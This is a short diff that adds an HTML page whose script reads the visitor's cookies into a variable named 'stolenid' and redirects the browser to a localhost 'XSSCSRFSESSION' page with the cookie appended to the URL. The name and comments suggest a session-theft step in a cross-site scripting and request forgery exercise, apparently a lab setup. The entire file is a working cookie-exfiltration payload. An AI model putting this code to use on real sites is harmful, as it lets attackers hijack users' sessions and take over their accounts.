@@ -1,0 +1,7 @@
+<!DOCTYPE html>
+<script>
+    // Get the session id (no need to encode because it breaks the other script)
+    var stolenid = document.cookie
+    // Redirect now to other html for transfer page
+    window.location.href = "http://localhost:15000/XSSCSRFSESSION.html?" + stolenid;
+</script>
